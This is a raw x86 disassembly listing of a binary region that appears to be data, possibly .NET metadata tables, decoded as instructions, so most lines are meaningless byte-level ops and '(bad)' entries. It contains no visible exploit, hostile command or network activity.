  405c9d:	00 00                	add    %al,(%eax)
  405c9f:	00 86 18 4a 02 35    	add    %al,0x35024a18(%esi)
  405ca5:	00 11                	add    %dl,(%ecx)
  405ca7:	00 32                	add    %dh,(%edx)
  405ca9:	21 00                	and    %eax,(%eax)
  405cab:	00 00                	add    %al,(%eax)
  405cad:	00 86 18 4a 02 35    	add    %al,0x35024a18(%esi)
  405cb3:	00 11                	add    %dl,(%ecx)
  405cb5:	00 5b 21             	add    %bl,0x21(%ebx)
  405cb8:	00 00                	add    %al,(%eax)
  405cba:	00 00                	add    %al,(%eax)
  405cbc:	c6                   	(bad)
  405cbd:	08 b7 04 cb 00 11    	or     %dh,0x1100cb04(%edi)
  405cc3:	00 63 21             	add    %ah,0x21(%ebx)
  405cc6:	00 00                	add    %al,(%eax)
  405cc8:	00 00                	add    %al,(%eax)
  405cca:	c6                   	(bad)
  405ccb:	08 cb                	or     %cl,%bl
  405ccd:	04 d0                	add    $0xd0,%al
  405ccf:	00 11                	add    %dl,(%ecx)
  405cd1:	00 6c 21 00          	add    %ch,0x0(%ecx,%eiz,1)
  405cd5:	00 00                	add    %al,(%eax)
  405cd7:	00 c6                	add    %al,%dh
  405cd9:	08 e4                	or     %ah,%ah
  405cdb:	04 d6                	add    $0xd6,%al
  405cdd:	00 12                	add    %dl,(%edx)
  405cdf:	00 77 21             	add    %dh,0x21(%edi)
  405ce2:	00 00                	add    %al,(%eax)
  405ce4:	00 00                	add    %al,(%eax)
  405ce6:	c6                   	(bad)
  405ce7:	08 f3                	or     %dh,%bl
  405ce9:	04 db                	add    $0xdb,%al
  405ceb:	00 12                	add    %dl,(%edx)
  405ced:	00 79 21             	add    %bh,0x21(%ecx)
  405cf0:	00 00                	add    %al,(%eax)
  405cf2:	00 00                	add    %al,(%eax)
  405cf4:	c6                   	(bad)
  405cf5:	08 0e                	or     %cl,(%esi)
  405cf7:	05 e1 00 13 00       	add    $0x1300e1,%eax
  405cfc:	82 21 00             	andb   $0x0,(%ecx)
  405cff:	00 00                	add    %al,(%eax)
  405d01:	00 c6                	add    %al,%dh
  405d03:	08 21                	or     %ah,(%ecx)
  405d05:	05 e6 00 13 00       	add    $0x1300e6,%eax
  405d0a:	84 21                	test   %ah,(%ecx)
  405d0c:	00 00                	add    %al,(%eax)
  405d0e:	00 00                	add    %al,(%eax)
  405d10:	c6                   	(bad)
  405d11:	08 34 05 ec 00 14 00 	or     %dh,0x1400ec(,%eax,1)
  405d18:	88 21                	mov    %ah,(%ecx)
  405d1a:	00 00                	add    %al,(%eax)
  405d1c:	00 00                	add    %al,(%eax)
  405d1e:	c6                   	(bad)
  405d1f:	08 43 05             	or     %al,0x5(%ebx)
  405d22:	f0 00 14 00          	lock add %dl,(%eax,%eax,1)
  405d26:	8c 21                	mov    %fs,(%ecx)
  405d28:	00 00                	add    %al,(%eax)
  405d2a:	00 00                	add    %al,(%eax)
  405d2c:	c6 00 61             	movb   $0x61,(%eax)
  405d2f:	05 35 00 15 00       	add    $0x150035,%eax
  405d34:	eb 21                	jmp    0x405d57
  405d36:	00 00                	add    %al,(%eax)
  405d38:	00 00                	add    %al,(%eax)
  405d3a:	c6                   	(bad)
  405d3b:	08 72 05             	or     %dh,0x5(%edx)
  405d3e:	cb                   	lret
  405d3f:	00 15 00 f3 21 00    	add    %dl,0x21f300
  405d45:	00 00                	add    %al,(%eax)
  405d47:	00 c6                	add    %al,%dh
  405d49:	08 86 05 d0 00 15    	or     %al,0x1500d005(%esi)
  405d4f:	00 fc                	add    %bh,%ah
  405d51:	21 00                	and    %eax,(%eax)
  405d53:	00 00                	add    %al,(%eax)
  405d55:	00 c6                	add    %al,%dh
  405d57:	00 af 05 f9 00 16    	add    %ch,0x1600f905(%edi)
  405d5d:	00 87 22 00 00 00    	add    %al,0x22(%edi)
  405d63:	00 c6                	add    %al,%dh
  405d65:	08 c1                	or     %al,%cl
  405d67:	05 06 01 17 00       	add    $0x170106,%eax
  405d6c:	8a 22                	mov    (%edx),%ah
  405d6e:	00 00                	add    %al,(%eax)
  405d70:	00 00                	add    %al,(%eax)
  405d72:	c6                   	(bad)
  405d73:	08 d2                	or     %dl,%dl
  405d75:	05 d6 00 17 00       	add    $0x1700d6,%eax
  405d7a:	98                   	cwtl
  405d7b:	22 00                	and    (%eax),%al
  405d7d:	00 00                	add    %al,(%eax)
  405d7f:	00 c6                	add    %al,%dh
  405d81:	08 ec                	or     %ch,%ah
  405d83:	05 d6 00 17 00       	add    $0x1700d6,%eax
  405d88:	a3 22 00 00 00       	mov    %eax,0x22
  405d8d:	00 c6                	add    %al,%dh
  405d8f:	00 15 06 0a 01 17    	add    %dl,0x17010a06
  405d95:	00 cb                	add    %cl,%bl
  405d97:	22 00                	and    (%eax),%al
  405d99:	00 00                	add    %al,(%eax)
  405d9b:	00 c6                	add    %al,%dh
  405d9d:	00 1d 06 11 01 18    	add    %bl,0x18011106
  405da3:	00 cd                	add    %cl,%ch
  405da5:	22 00                	and    (%eax),%al
  405da7:	00 00                	add    %al,(%eax)
  405da9:	00 c6                	add    %al,%dh
  405dab:	00 32                	add    %dh,(%edx)
  405dad:	06                   	push   %es
  405dae:	1d 01 1c 00 cf       	sbb    $0xcf001c01,%eax
  405db3:	22 00                	and    (%eax),%al
  405db5:	00 00                	add    %al,(%eax)
  405db7:	00 c6                	add    %al,%dh
  405db9:	00 32                	add    %dh,(%edx)
  405dbb:	06                   	push   %es
  405dbc:	25 01 1e 00 d4       	and    $0xd4001e01,%eax
  405dc1:	22 00                	and    (%eax),%al
  405dc3:	00 00                	add    %al,(%eax)
  405dc5:	00 c6                	add    %al,%dh
  405dc7:	08 44 06 e1          	or     %al,-0x1f(%esi,%eax,1)
  405dcb:	00 20                	add    %ah,(%eax)
  405dcd:	00 fa                	add    %bh,%dl
  405dcf:	22 00                	and    (%eax),%al
  405dd1:	00 00                	add    %al,(%eax)
  405dd3:	00 c6                	add    %al,%dh
  405dd5:	08 57 06             	or     %dl,0x6(%edi)
  405dd8:	e6 00                	out    %al,$0x0
  405dda:	20 00                	and    %al,(%eax)
  405ddc:	fc                   	cld
  405ddd:	22 00                	and    (%eax),%al
  405ddf:	00 00                	add    %al,(%eax)
  405de1:	00 c6                	add    %al,%dh
  405de3:	08 6a 06             	or     %ch,0x6(%edx)
  405de6:	d6                   	salc
  405de7:	00 21                	add    %ah,(%ecx)
  405de9:	00 24 23             	add    %ah,(%ebx,%eiz,1)
  405dec:	00 00                	add    %al,(%eax)
  405dee:	00 00                	add    %al,(%eax)
  405df0:	c6                   	(bad)
  405df1:	08 79 06             	or     %bh,0x6(%ecx)
  405df4:	db 00                	fildl  (%eax)
  405df6:	21 00                	and    %eax,(%eax)
  405df8:	26 23 00             	and    %es:(%eax),%eax
  405dfb:	00 00                	add    %al,(%eax)
  405dfd:	00 c6                	add    %al,%dh
  405dff:	08 88 06 33 01 22    	or     %cl,0x22013306(%eax)
  405e05:	00 32                	add    %dh,(%edx)
  405e07:	23 00                	and    (%eax),%eax
  405e09:	00 00                	add    %al,(%eax)
  405e0b:	00 c6                	add    %al,%dh
  405e0d:	08 98 06 37 01 22    	or     %bl,0x22013706(%eax)
  405e13:	00 34 23             	add    %dh,(%ebx,%eiz,1)
  405e16:	00 00                	add    %al,(%eax)
  405e18:	00 00                	add    %al,(%eax)
  405e1a:	86 18                	xchg   %bl,(%eax)
  405e1c:	4a                   	dec    %edx
  405e1d:	02 35 00 23 00 00    	add    0x2300,%dh
  405e23:	00 00                	add    %al,(%eax)
  405e25:	00 80 00 91 20 44    	add    %al,0x44209100(%eax)
  405e2b:	07                   	pop    %es
  405e2c:	57                   	push   %edi
  405e2d:	01 23                	add    %esp,(%ebx)
  405e2f:	00 44 23 00          	add    %al,0x0(%ebx,%eiz,1)
  405e33:	00 00                	add    %al,(%eax)
  405e35:	00 96 00 5e 07 5c    	add    %dl,0x5c075e00(%esi)
  405e3b:	01 24 00             	add    %esp,(%eax,%eax,1)
  405e3e:	b4 25                	mov    $0x25,%ah
  405e40:	00 00                	add    %al,(%eax)
  405e42:	00 00                	add    %al,(%eax)
  405e44:	96                   	xchg   %eax,%esi
  405e45:	00 5e 07             	add    %bl,0x7(%esi)
  405e48:	66 01 28             	add    %bp,(%eax)
  405e4b:	00 bf 25 00 00 00    	add    %bh,0x25(%edi)
  405e51:	00 86 18 4a 02 35    	add    %al,0x35024a18(%esi)
  405e57:	00 2b                	add    %ch,(%ebx)
  405e59:	00 c8                	add    %cl,%al
  405e5b:	25 00 00 00 00       	and    $0x0,%eax
  405e60:	96                   	xchg   %eax,%esi
  405e61:	00 5e 07             	add    %bl,0x7(%esi)
  405e64:	6f                   	outsl  %ds:(%esi),(%dx)
  405e65:	01 2b                	add    %ebp,(%ebx)
  405e67:	00 f8                	add    %bh,%al
  405e69:	28 00                	sub    %al,(%eax)
  405e6b:	00 00                	add    %al,(%eax)
  405e6d:	00 86 18 4a 02 35    	add    %al,0x35024a18(%esi)
  405e73:	00 2f                	add    %ch,(%edi)
  405e75:	00 00                	add    %al,(%eax)
  405e77:	00 00                	add    %al,(%eax)
  405e79:	00 80 00 96 20 a1    	add    %al,-0x5edf6a00(%eax)
  405e7f:	07                   	pop    %es
  405e80:	7c 01                	jl     0x405e83
  405e82:	2f                   	das
  405e83:	00 00                	add    %al,(%eax)
  405e85:	29 00                	sub    %eax,(%eax)
  405e87:	00 00                	add    %al,(%eax)
  405e89:	00 91 00 b0 07 88    	add    %dl,-0x77f85000(%ecx)
  405e8f:	01 35 00 5c 29 00    	add    %esi,0x295c00
  405e95:	00 00                	add    %al,(%eax)
  405e97:	00 96 00 5e 07 90    	add    %dl,-0x6ff8a200(%esi)
  405e9d:	01 38                	add    %edi,(%eax)
  405e9f:	00 7c 2a 00          	add    %bh,0x0(%edx,%ebp,1)
  405ea3:	00 00                	add    %al,(%eax)
  405ea5:	00 86 18 4a 02 35    	add    %al,0x35024a18(%esi)
  405eab:	00 3b                	add    %bh,(%ebx)
  405ead:	00 84 2a 00 00 00 00 	add    %al,0x0(%edx,%ebp,1)
  405eb4:	86 18                	xchg   %bl,(%eax)
  405eb6:	4a                   	dec    %edx
  405eb7:	02 35 00 3b 00 e0    	add    0xe0003b00,%dh
  405ebd:	2a 00                	sub    (%eax),%al
  405ebf:	00 00                	add    %al,(%eax)
  405ec1:	00 81 00 e2 07 9f    	add    %al,-0x60f81e00(%ecx)
  405ec7:	01 3b                	add    %edi,(%ebx)
  405ec9:	00 1c 2c             	add    %bl,(%esp,%ebp,1)
  405ecc:	00 00                	add    %al,(%eax)
  405ece:	00 00                	add    %al,(%eax)
  405ed0:	81 00 f8 07 9f 01    	addl   $0x19f07f8,(%eax)
  405ed6:	3d 00 58 2d 00       	cmp    $0x2d5800,%eax
  405edb:	00 00                	add    %al,(%eax)
  405edd:	00 81 00 99 08 bb    	add    %al,-0x44f76700(%ecx)
  405ee3:	01 3f                	add    %edi,(%edi)
  405ee5:	00 40 2e             	add    %al,0x2e(%eax)
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	00 00                	add    %al,(%eax)
  405eec:	81 00 a6 08 35 00    	addl   $0x3508a6,(%eax)
  405ef2:	40                   	inc    %eax
  405ef3:	00 14 2f             	add    %dl,(%edi,%ebp,1)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	00 00                	add    %al,(%eax)
  405efa:	81 00 cb 08 c2 01    	addl   $0x1c208cb,(%eax)
  405f00:	40                   	inc    %eax
  405f01:	00 90 2f 00 00 00    	add    %dl,0x2f(%eax)
  405f07:	00 81 00 d4 08 c9    	add    %al,-0x36f72c00(%ecx)
  405f0d:	01 42 00             	add    %eax,0x0(%edx)
  405f10:	1f                   	pop    %ds
  405f11:	32 00                	xor    (%eax),%al
  405f13:	00 00                	add    %al,(%eax)
  405f15:	00 86 00 db 08 ec    	add    %al,-0x13f72500(%esi)
  405f1b:	00 44 00 2c          	add    %al,0x2c(%eax,%eax,1)
  405f1f:	32 00                	xor    (%eax),%al
  405f21:	00 00                	add    %al,(%eax)
  405f23:	00 86 18 4a 02 35    	add    %al,0x35024a18(%esi)
  405f29:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  405f2d:	32 00                	xor    (%eax),%al
  405f2f:	00 00                	add    %al,(%eax)
  405f31:	00 86 18 4a 02 d0    	add    %al,-0x2ffdb5e8(%esi)
  405f37:	00 44 00 a8          	add    %al,-0x58(%eax,%eax,1)
  405f3b:	32 00                	xor    (%eax),%al
  405f3d:	00 00                	add    %al,(%eax)
  405f3f:	00 86 00 f3 08 d1    	add    %al,-0x2ef70d00(%esi)
  405f45:	01 45 00             	add    %eax,0x0(%ebp)
  405f48:	00 00                	add    %al,(%eax)
  405f4a:	00 00                	add    %al,(%eax)
  405f4c:	80 00 91             	addb   $0x91,(%eax)
  405f4f:	20 6d 09             	and    %ch,0x9(%ebp)
  405f52:	df 01                	filds  (%ecx)
  405f54:	46                   	inc    %esi
  405f55:	00 00                	add    %al,(%eax)
  405f57:	00 00                	add    %al,(%eax)
  405f59:	00 80 00 91 20 7a    	add    %al,0x7a209100(%eax)
  405f5f:	09 e5                	or     %esp,%ebp
  405f61:	01 47 00             	add    %eax,0x0(%edi)
  405f64:	f0 3a 00             	lock cmp (%eax),%al
  405f67:	00 00                	add    %al,(%eax)
  405f69:	00 96 00 86 09 eb    	add    %dl,-0x14f67a00(%esi)
  405f6f:	01 48 00             	add    %ecx,0x0(%eax)
  405f72:	18 3b                	sbb    %bh,(%ebx)
  405f74:	00 00                	add    %al,(%eax)
  405f76:	00 00                	add    %al,(%eax)
  405f78:	96                   	xchg   %eax,%esi
  405f79:	00 98 09 eb 01 48    	add    %bl,0x4801eb09(%eax)
  405f7f:	00 40 3b             	add    %al,0x3b(%eax)
  405f82:	00 00                	add    %al,(%eax)
  405f84:	00 00                	add    %al,(%eax)
  405f86:	96                   	xchg   %eax,%esi
  405f87:	00 ab 09 eb 01 48    	add    %ch,0x4801eb09(%ebx)
  405f8d:	00 66 3b             	add    %ah,0x3b(%esi)
  405f90:	00 00                	add    %al,(%eax)
  405f92:	00 00                	add    %al,(%eax)
  405f94:	86 18                	xchg   %bl,(%eax)
  405f96:	4a                   	dec    %edx
  405f97:	02 35 00 48 00 70    	add    0x70004800,%dh
  405f9d:	3b 00                	cmp    (%eax),%eax
  405f9f:	00 00                	add    %al,(%eax)
  405fa1:	00 86 18 4a 02 35    	add    %al,0x35024a18(%esi)
  405fa7:	00 48 00             	add    %cl,0x0(%eax)
  405faa:	bc 3b 00 00 00       	mov    $0x3b,%esp
  405faf:	00 c6                	add    %al,%dh
  405fb1:	00 4e 0b             	add    %cl,0xb(%esi)
  405fb4:	17                   	pop    %ss
  405fb5:	02 48 00             	add    0x0(%eax),%cl
  405fb8:	70 3f                	jo     0x405ff9
  405fba:	00 00                	add    %al,(%eax)
  405fbc:	00 00                	add    %al,(%eax)
  405fbe:	c6 00 55             	movb   $0x55,(%eax)
  405fc1:	0b 2a                	or     (%edx),%ebp
  405fc3:	02 4b 00             	add    0x0(%ebx),%cl
  405fc6:	90                   	nop
  405fc7:	3f                   	aas
  405fc8:	00 00                	add    %al,(%eax)
  405fca:	00 00                	add    %al,(%eax)
  405fcc:	c6 00 72             	movb   $0x72,(%eax)
  405fcf:	0b 37                	or     (%edi),%esi
  405fd1:	02 4f 00             	add    0x0(%edi),%cl
  405fd4:	f0 3f                	lock aas
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	00 00                	add    %al,(%eax)
  405fda:	c6 00 72             	movb   $0x72,(%eax)
  405fdd:	0b 45 02             	or     0x2(%ebp),%eax
  405fe0:	55                   	push   %ebp
  405fe1:	00 4b 40             	add    %cl,0x40(%ebx)
  405fe4:	00 00                	add    %al,(%eax)
  405fe6:	00 00                	add    %al,(%eax)
  405fe8:	c6                   	(bad)
  405fe9:	08 86 0b 4f 02 59    	or     %al,0x59024f0b(%esi)
  405fef:	00 54 40 00          	add    %dl,0x0(%eax,%eax,2)
  405ff3:	00 00                	add    %al,(%eax)
  405ff5:	00 c6                	add    %al,%dh
  405ff7:	00 a6 0b 33 01 59    	add    %ah,0x5901330b(%esi)
  405ffd:	00 84 40 00 00 00 00 	add    %al,0x0(%eax,%eax,2)
  406004:	81 00 cc 0b 54 02    	addl   $0x2540bcc,(%eax)
  40600a:	59                   	pop    %ecx
  40600b:	00 00                	add    %al,(%eax)
  40600d:	41                   	inc    %ecx
  40600e:	00 00                	add    %al,(%eax)
  406010:	00 00                	add    %al,(%eax)
  406012:	c6 00 d8             	movb   $0xd8,(%eax)
  406015:	0b 54 02 59          	or     0x59(%edx,%eax,1),%edx
  406019:	00 58 41             	add    %bl,0x41(%eax)
  40601c:	00 00                	add    %al,(%eax)
  40601e:	00 00                	add    %al,(%eax)
  406020:	c6 00 ef             	movb   $0xef,(%eax)
  406023:	0b 5a 02             	or     0x2(%edx),%ebx
  406026:	59                   	pop    %ecx
  406027:	00 5a 41             	add    %bl,0x41(%edx)
  40602a:	00 00                	add    %al,(%eax)
  40602c:	00 00                	add    %al,(%eax)
  40602e:	c6 00 ef             	movb   $0xef,(%eax)
  406031:	0b 37                	or     (%edi),%esi
  406033:	01 5c 00 5c          	add    %ebx,0x5c(%eax,%eax,1)
  406037:	41                   	inc    %ecx
  406038:	00 00                	add    %al,(%eax)
  40603a:	00 00                	add    %al,(%eax)
  40603c:	c6 00 f5             	movb   $0xf5,(%eax)
  40603f:	0b 37                	or     (%edi),%esi
  406041:	01 5d 00             	add    %ebx,0x0(%ebp)
  406044:	5e                   	pop    %esi
  406045:	41                   	inc    %ecx
  406046:	00 00                	add    %al,(%eax)
  406048:	00 00                	add    %al,(%eax)
  40604a:	c6 00 04             	movb   $0x4,(%eax)
  40604d:	0c 37                	or     $0x37,%al
  40604f:	01 5e 00             	add    %ebx,0x0(%esi)
  406052:	60                   	pusha
  406053:	41                   	inc    %ecx
  406054:	00 00                	add    %al,(%eax)
  406056:	00 00                	add    %al,(%eax)
  406058:	c6 00 13             	movb   $0x13,(%eax)
  40605b:	0c 35                	or     $0x35,%al
  40605d:	00 5f 00             	add    %bl,0x0(%edi)
  406060:	62 41 00             	bound  %eax,0x0(%ecx)
  406063:	00 00                	add    %al,(%eax)
  406065:	00 c6                	add    %al,%dh
  406067:	00 13                	add    %dl,(%ebx)
  406069:	0c 5a                	or     $0x5a,%al
  40606b:	02 5f 00             	add    0x0(%edi),%bl
  40606e:	64 41                	fs inc %ecx
  406070:	00 00                	add    %al,(%eax)
  406072:	00 00                	add    %al,(%eax)
  406074:	c6 00 13             	movb   $0x13,(%eax)
  406077:	0c 37                	or     $0x37,%al
  406079:	01 62 00             	add    %esp,0x0(%edx)
  40607c:	68 41 00 00 00       	push   $0x41
  406081:	00 c6                	add    %al,%dh
  406083:	00 20                	add    %ah,(%eax)
  406085:	0c 67                	or     $0x67,%al
  406087:	02 63 00             	add    0x0(%ebx),%ah
  40608a:	cc                   	int3
  40608b:	41                   	inc    %ecx
  40608c:	00 00                	add    %al,(%eax)
  40608e:	00 00                	add    %al,(%eax)
  406090:	c6 00 2e             	movb   $0x2e,(%eax)
  406093:	0c 37                	or     $0x37,%al
  406095:	01 65 00             	add    %esp,0x0(%ebp)
  406098:	ce                   	into
  406099:	41                   	inc    %ecx
  40609a:	00 00                	add    %al,(%eax)
  40609c:	00 00                	add    %al,(%eax)
  40609e:	c6 00 3f             	movb   $0x3f,(%eax)
  4060a1:	0c 37                	or     $0x37,%al
  4060a3:	01 66 00             	add    %esp,0x0(%esi)
  4060a6:	d0 41 00             	rolb   $1,0x0(%ecx)
  4060a9:	00 00                	add    %al,(%eax)
  4060ab:	00 86 18 4a 02 85    	add    %al,-0x7afdb5e8(%esi)
  4060b1:	02 67 00             	add    0x0(%edi),%ah
  4060b4:	1c 42                	sbb    $0x42,%al
  4060b6:	00 00                	add    %al,(%eax)
  4060b8:	00 00                	add    %al,(%eax)
  4060ba:	c6                   	(bad)
  4060bb:	08 b5 0c 8d 02 69    	or     %dh,0x69028d0c(%ebp)
  4060c1:	00 56 42             	add    %dl,0x42(%esi)
  4060c4:	00 00                	add    %al,(%eax)
  4060c6:	00 00                	add    %al,(%eax)
  4060c8:	c6                   	(bad)
  4060c9:	08 d8                	or     %bl,%al
  4060cb:	0c 96                	or     $0x96,%al
  4060cd:	02 69 00             	add    0x0(%ecx),%ch
  4060d0:	5e                   	pop    %esi
  4060d1:	42                   	inc    %edx
  4060d2:	00 00                	add    %al,(%eax)
  4060d4:	00 00                	add    %al,(%eax)
  4060d6:	c6                   	(bad)
  4060d7:	08 eb                	or     %ch,%bl
  4060d9:	0c 96                	or     $0x96,%al
  4060db:	02 69 00             	add    0x0(%ecx),%ch
  4060de:	66 42                	inc    %dx
  4060e0:	00 00                	add    %al,(%eax)
  4060e2:	00 00                	add    %al,(%eax)
  4060e4:	c6                   	(bad)
  4060e5:	08 00                	or     %al,(%eax)
  4060e7:	0d 9c 02 69 00       	or     $0x69029c,%eax
  4060ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4060ed:	42                   	inc    %edx
  4060ee:	00 00                	add    %al,(%eax)
  4060f0:	00 00                	add    %al,(%eax)
  4060f2:	c6                   	(bad)
  4060f3:	08 0f                	or     %cl,(%edi)
  4060f5:	0d 33 01 69 00       	or     $0x690133,%eax
  4060fa:	75 42                	jne    0x40613e
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	00 00                	add    %al,(%eax)
  406100:	c6                   	(bad)
  406101:	08 18                	or     %bl,(%eax)
  406103:	0d a2 02 69 00       	or     $0x6902a2,%eax
  406108:	7d 42                	jge    0x40614c
  40610a:	00 00                	add    %al,(%eax)
  40610c:	00 00                	add    %al,(%eax)
  40610e:	c6                   	(bad)
  40610f:	08 27                	or     %ah,(%edi)
  406111:	0d a7 02 69 00       	or     $0x6902a7,%eax
  406116:	89 42 00             	mov    %eax,0x0(%edx)
  406119:	00 00                	add    %al,(%eax)
  40611b:	00 c6                	add    %al,%dh
  40611d:	00 33                	add    %dh,(%ebx)
  40611f:	0d 35 00 69 00       	or     $0x690035,%eax
  406124:	8b 42 00             	mov    0x0(%edx),%eax
  406127:	00 00                	add    %al,(%eax)
  406129:	00 c6                	add    %al,%dh
  40612b:	00 45 0d             	add    %al,0xd(%ebp)
  40612e:	35 00 69 00 8d       	xor    $0x8d006900,%eax
  406133:	42                   	inc    %edx
  406134:	00 00                	add    %al,(%eax)
  406136:	00 00                	add    %al,(%eax)
  406138:	c6 00 56             	movb   $0x56,(%eax)
  40613b:	0d 35 00 69 00       	or     $0x690035,%eax
  406140:	8f 42 00             	pop    0x0(%edx)
  406143:	00 00                	add    %al,(%eax)
  406145:	00 c6                	add    %al,%dh
  406147:	00 6d 0d             	add    %ch,0xd(%ebp)
  40614a:	35 00 69 00 91       	xor    $0x91006900,%eax
  40614f:	42                   	inc    %edx
  406150:	00 00                	add    %al,(%eax)
  406152:	00 00                	add    %al,(%eax)
  406154:	c6 00 82             	movb   $0x82,(%eax)
  406157:	0d f0 00 69 00       	or     $0x6900f0,%eax
  40615c:	ab                   	stos   %eax,%es:(%edi)
  40615d:	42                   	inc    %edx
  40615e:	00 00                	add    %al,(%eax)
  406160:	00 00                	add    %al,(%eax)
  406162:	86 18                	xchg   %bl,(%eax)
  406164:	4a                   	dec    %edx
  406165:	02 c9                	add    %cl,%cl
  406167:	02 6a 00             	add    0x0(%edx),%ch
  40616a:	c8 42 00 00          	enter  $0x42,$0x0
  40616e:	00 00                	add    %al,(%eax)
  406170:	86 08                	xchg   %cl,(%eax)
  406172:	d3 0d cb 00 6b 00    	rorl   %cl,0x6b00cb
  406178:	d5 42                	aad    $0x42
  40617a:	00 00                	add    %al,(%eax)
  40617c:	00 00                	add    %al,(%eax)
  40617e:	86 08                	xchg   %cl,(%eax)
  406180:	ec                   	in     (%dx),%al
  406181:	0d d0 00 6b 00       	or     $0x6b00d0,%eax
  406186:	e3 42                	jecxz  0x4061ca
  406188:	00 00                	add    %al,(%eax)
  40618a:	00 00                	add    %al,(%eax)
  40618c:	86 08                	xchg   %cl,(%eax)
  40618e:	05 0e cb 00 6c       	add    $0x6c00cb0e,%eax
  406193:	00 f0                	add    %dh,%al
  406195:	42                   	inc    %edx
  406196:	00 00                	add    %al,(%eax)
  406198:	00 00                	add    %al,(%eax)
  40619a:	86 08                	xchg   %cl,(%eax)
  40619c:	1e                   	push   %ds
  40619d:	0e                   	push   %cs
  40619e:	d0 00                	rolb   $1,(%eax)
  4061a0:	6c                   	insb   (%dx),%es:(%edi)
  4061a1:	00 fe                	add    %bh,%dh
  4061a3:	42                   	inc    %edx
  4061a4:	00 00                	add    %al,(%eax)
  4061a6:	00 00                	add    %al,(%eax)
  4061a8:	86 08                	xchg   %cl,(%eax)
  4061aa:	37                   	aaa
  4061ab:	0e                   	push   %cs
  4061ac:	cb                   	lret
  4061ad:	00 6d 00             	add    %ch,0x0(%ebp)
  4061b0:	0b 43 00             	or     0x0(%ebx),%eax
  4061b3:	00 00                	add    %al,(%eax)
  4061b5:	00 86 08 52 0e d0    	add    %al,-0x2ff1adf8(%esi)
  4061bb:	00 6d 00             	add    %ch,0x0(%ebp)
  4061be:	19 43 00             	sbb    %eax,0x0(%ebx)
  4061c1:	00 00                	add    %al,(%eax)
  4061c3:	00 86 08 6d 0e cb    	add    %al,-0x34f192f8(%esi)
  4061c9:	00 6e 00             	add    %ch,0x0(%esi)
  4061cc:	26 43                	es inc %ebx
  4061ce:	00 00                	add    %al,(%eax)
  4061d0:	00 00                	add    %al,(%eax)
  4061d2:	86 08                	xchg   %cl,(%eax)
  4061d4:	88 0e                	mov    %cl,(%esi)
  4061d6:	d0 00                	rolb   $1,(%eax)
  4061d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4061d9:	00 34 43             	add    %dh,(%ebx,%eax,2)
  4061dc:	00 00                	add    %al,(%eax)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	86 08                	xchg   %cl,(%eax)
  4061e2:	a3 0e cb 00 6f       	mov    %eax,0x6f00cb0e
  4061e7:	00 41 43             	add    %al,0x43(%ecx)
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	86 08                	xchg   %cl,(%eax)
  4061f0:	bc 0e d0 00 6f       	mov    $0x6f00d00e,%esp
  4061f5:	00 4f 43             	add    %cl,0x43(%edi)
  4061f8:	00 00                	add    %al,(%eax)
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	86 08                	xchg   %cl,(%eax)
  4061fe:	d5 0e                	aad    $0xe
  406200:	cb                   	lret
  406201:	00 70 00             	add    %dh,0x0(%eax)
  406204:	5c                   	pop    %esp
  406205:	43                   	inc    %ebx
  406206:	00 00                	add    %al,(%eax)
  406208:	00 00                	add    %al,(%eax)
  40620a:	86 08                	xchg   %cl,(%eax)
  40620c:	ee                   	out    %al,(%dx)
  40620d:	0e                   	push   %cs
  40620e:	d0 00                	rolb   $1,(%eax)
  406210:	70 00                	jo     0x406212
  406212:	6a 43                	push   $0x43
  406214:	00 00                	add    %al,(%eax)
  406216:	00 00                	add    %al,(%eax)
  406218:	86 08                	xchg   %cl,(%eax)
  40621a:	07                   	pop    %es
  40621b:	0f cb                	bswap  %ebx
  40621d:	00 71 00             	add    %dh,0x0(%ecx)
  406220:	77 43                	ja     0x406265
  406222:	00 00                	add    %al,(%eax)
  406224:	00 00                	add    %al,(%eax)
  406226:	86 08                	xchg   %cl,(%eax)
  406228:	22 0f                	and    (%edi),%cl
  40622a:	d0 00                	rolb   $1,(%eax)
  40622c:	71 00                	jno    0x40622e
  40622e:	85 43 00             	test   %eax,0x0(%ebx)
  406231:	00 00                	add    %al,(%eax)
  406233:	00 86 08 3d 0f cb    	add    %al,-0x34f0c2f8(%esi)
  406239:	00 72 00             	add    %dh,0x0(%edx)
  40623c:	92                   	xchg   %eax,%edx
  40623d:	43                   	inc    %ebx
  40623e:	00 00                	add    %al,(%eax)
  406240:	00 00                	add    %al,(%eax)
  406242:	86 08                	xchg   %cl,(%eax)
  406244:	58                   	pop    %eax
  406245:	0f d0                	(bad)
  406247:	00 72 00             	add    %dh,0x0(%edx)
  40624a:	a0 43 00 00 00       	mov    0x43,%al
  40624f:	00 86 08 73 0f cb    	add    %al,-0x34f08cf8(%esi)
  406255:	00 73 00             	add    %dh,0x0(%ebx)
  406258:	ad                   	lods   %ds:(%esi),%eax
  406259:	43                   	inc    %ebx
  40625a:	00 00                	add    %al,(%eax)
  40625c:	00 00                	add    %al,(%eax)
  40625e:	86 08                	xchg   %cl,(%eax)
  406260:	8f                   	(bad)
  406261:	0f d0                	(bad)
  406263:	00 73 00             	add    %dh,0x0(%ebx)
  406266:	bb 43 00 00 00       	mov    $0x43,%ebx
  40626b:	00 86 08 ab 0f cb    	add    %al,-0x34f054f8(%esi)
  406271:	00 74 00 c8          	add    %dh,-0x38(%eax,%eax,1)
  406275:	43                   	inc    %ebx
  406276:	00 00                	add    %al,(%eax)
  406278:	00 00                	add    %al,(%eax)
  40627a:	86 08                	xchg   %cl,(%eax)
  40627c:	c7                   	(bad)
  40627d:	0f d0                	(bad)
  40627f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406283:	00 00                	add    %al,(%eax)
  406285:	00 00                	add    %al,(%eax)
  406287:	00 c6                	add    %al,%dh
  406289:	0d e3 0f 06 01       	or     $0x1060fe3,%eax
  40628e:	75 00                	jne    0x406290
  406290:	00 00                	add    %al,(%eax)
  406292:	00 00                	add    %al,(%eax)
  406294:	00 00                	add    %al,(%eax)
  406296:	c6                   	(bad)
  406297:	0d f2 0f cf 02       	or     $0x2cf0ff2,%eax
  40629c:	75 00                	jne    0x40629e
